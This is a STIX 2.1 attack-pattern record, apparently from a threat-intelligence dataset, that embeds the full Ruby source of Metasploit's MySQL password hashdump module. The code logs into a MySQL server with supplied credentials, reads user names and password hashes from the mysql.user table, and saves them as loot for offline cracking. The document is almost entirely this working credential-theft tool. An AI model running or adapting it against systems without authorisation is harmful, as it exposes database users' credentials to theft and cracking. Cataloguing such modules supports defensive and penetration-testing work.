{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--44bb8c2f-03ca-4ea4-8e5f-d156aee25fc9",
    "created": "2024-08-14T16:31:17.841676Z",
    "modified": "2024-08-14T16:31:17.84168Z",
    "name": "MYSQL Password Hashdump",
    "description": "( This module extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mysql/mysql_hashdump.rb",
            "external_id": "mysql_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Auxiliary::Report\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MYSQL Password Hashdump',\n      'Description'    => %(\n          This module extracts the usernames and encrypted password\n        hashes from a MySQL server and stores them for later cracking.\n      ),\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n\n    return unless mysql_login_datastore\n\n    service_data = {\n      address: ip,\n      port: rport,\n      service_name: 'mysql',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: datastore['PASSWORD'],\n      private_type: :password,\n      username: datastore['USERNAME']\n    }\n\n    credential_data.merge!(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }\n    login_data.merge!(service_data)\n\n    create_credential_login(login_data)\n\n    # Grab the username and password hashes and store them as loot\n    version = mysql_get_variable(\"@@version\")\n\n    if version.nil?\n      print_error(\"There was an error reading the version\")\n      return\n    end\n\n    # Starting from MySQL 5.7, the 'password' column was changed to 'authentication_string'.\n    if version[0..2].to_f > 5.6\n      res = mysql_query(\"SELECT user,authentication_string from mysql.user\")\n    else\n      res = mysql_query(\"SELECT user,password from mysql.user\")\n    end\n\n    if res.nil?\n      print_error(\"There was an error reading the MySQL User Table\")\n      return\n    end\n\n    service_data = {\n      address: ::Rex::Socket.getaddress(rhost, true),\n      port: rport,\n      service_name: 'mysql',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      jtr_format: 'mysql,mysql-sha1',\n      module_fullname: self.fullname,\n      private_type: :nonreplayable_hash\n    }\n\n    credential_data.merge!(service_data)\n\n    if res.size > 0\n      res.each do |row|\n        credential_data[:username]     = row[0]\n        credential_data[:private_data] = row[1]\n        print_good(\"Saving HashString as Loot: #{row[0]}:#{row[1]}\")\n        credential_core = create_credential(credential_data)\n        login_data = {\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n        login_data.merge!(service_data)\n        create_credential_login(login_data)\n      end\n    end\n  end\nend\n"
}